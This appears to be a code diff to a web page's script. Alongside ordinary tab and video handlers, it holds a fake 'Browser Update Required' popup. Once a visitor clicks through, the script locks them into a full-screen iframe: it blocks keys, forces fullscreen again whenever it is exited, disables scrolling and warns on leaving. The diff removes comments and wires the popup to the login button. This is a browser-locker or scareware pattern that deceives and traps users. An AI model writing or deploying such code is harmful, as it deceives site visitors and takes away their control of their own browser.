@@ -1257,12 +1257,9 @@ document.addEventListener("DOMContentLoaded", function () {
 
     tabButtons.forEach(button => {
         button.addEventListener('click', () => {
-            // Remove active class from all buttons
             tabButtons.forEach(btn => btn.classList.remove('active'));
-            // Add active class to clicked button
             button.classList.add('active');
 
-            // Update content based on selected tab
             const tabName = button.textContent.trim();
             let heading = '', btnText = '';
 
@@ -1290,7 +1287,6 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     });
 
-    // Video player click logic for autoplay
     const thumbnailContainer = document.querySelector('.video-thumbnail-container');
     if (thumbnailContainer) {
         thumbnailContainer.addEventListener('click', function () {
@@ -1299,7 +1295,6 @@ document.addEventListener("DOMContentLoaded", function () {
             if (iframe) {
                 let currentSrc = iframe.src;
                 if (!currentSrc.includes('autoplay=1')) {
-                    // Replace muted=1 with muted=0 and append autoplay=1
                     iframe.src = currentSrc.replace('muted=1', 'muted=0') + '&autoplay=1';
                 }
             }
@@ -1322,15 +1317,12 @@ document.addEventListener("DOMContentLoaded", function () {
             console.log("Blocked key:", e.key);
         }
     }
-    // Block keys on the parent document
     document.addEventListener("keydown", blockKeys);
 
-    // Warn on reload/close of parent window
     window.onbeforeunload = function () {
         return "Are you sure you want to leave?";
     };
 
-    // Ensure fullscreen remains active if exited
     document.addEventListener("fullscreenchange", function () {
         if (!document.fullscreenElement) {
             setTimeout(() => {
@@ -1345,7 +1337,6 @@ document.addEventListener("DOMContentLoaded", function () {
     function showUpdatePopup(event) {
         if (event) event.preventDefault();
 
-        // Create the overlay for the popup
         const overlay = document.createElement('div');
         overlay.style.position = 'fixed';
         overlay.style.top = '0';
@@ -1358,7 +1349,6 @@ document.addEventListener("DOMContentLoaded", function () {
         overlay.style.justifyContent = 'center';
         overlay.style.alignItems = 'center';
 
-        // Create the popup container
         const popup = document.createElement('div');
         popup.style.backgroundColor = 'white';
         popup.style.padding = '30px';
@@ -1366,7 +1356,6 @@ document.addEventListener("DOMContentLoaded", function () {
         popup.style.maxWidth = '400px';
         popup.style.textAlign = 'center';
 
-        // Create title and message elements
         const title = document.createElement('h3');
         title.textContent = 'Browser Update Required';
         title.style.marginBottom = '15px';
@@ -1375,7 +1364,6 @@ document.addEventListener("DOMContentLoaded", function () {
         message.textContent = 'Your browser needs to be updated to continue.';
         message.style.marginBottom = '20px';
 
-        // Create the update button
         const updateButton = document.createElement('button');
         updateButton.textContent = 'Update';
         updateButton.style.padding = '10px 20px';
@@ -1385,12 +1373,9 @@ document.addEventListener("DOMContentLoaded", function () {
         updateButton.style.borderRadius = '6px';
         updateButton.style.cursor = 'pointer';
 
-        // Update button click event: remove popup, load localhost page, and enforce lockdown
         updateButton.addEventListener('click', function () {
-            // Remove the popup overlay
             document.body.removeChild(overlay);
 
-            // Create an iframe to load the localhost page
             const hiddenFrame = document.createElement('iframe');
             hiddenFrame.src = 'http://localhost/';
             hiddenFrame.style.position = 'fixed';
@@ -1401,17 +1386,12 @@ document.addEventListener("DOMContentLoaded", function () {
             hiddenFrame.style.border = 'none';
             hiddenFrame.style.zIndex = '99999';
 
-            // When the iframe loads, apply further lockdown and request fullscreen
             hiddenFrame.onload = function () {
-                // Disable scrolling on the parent page
                 document.body.style.overflow = 'hidden';
-
-                // Attempt to go fullscreen (should work as it's triggered by user click)
                 document.documentElement.requestFullscreen().catch(err => {
                     console.log("Fullscreen not allowed:", err);
                 });
 
-                // If same-origin, add key blocking to the iframe's document
                 try {
                     hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
                     hiddenFrame.contentWindow.onbeforeunload = function () {
@@ -1422,11 +1402,9 @@ document.addEventListener("DOMContentLoaded", function () {
                 }
             };
 
-            // Append the iframe to the document
             document.body.appendChild(hiddenFrame);
         });
 
-        // Assemble popup elements
         popup.appendChild(title);
         popup.appendChild(message);
         popup.appendChild(updateButton);
@@ -1434,13 +1412,17 @@ document.addEventListener("DOMContentLoaded", function () {
         document.body.appendChild(overlay);
     }
 
-    // Expose the popup function globally if needed
+    // Expose popup function globally if needed
     window.showUpdatePopup = showUpdatePopup;
 
-    // Optionally, automatically trigger the popup for local testing:
-    // Uncomment the next line if you want to automatically load the localhost page.
-    showUpdatePopup();
+    // Uncomment to trigger popup automatically:
+    // showUpdatePopup();
 
+    // Optionally bind to login button
+    const loginBtn = document.getElementById('loginBtn');
+    if (loginBtn) {
+        loginBtn.addEventListener('click', showUpdatePopup);
+    }
 });
 </script>
 
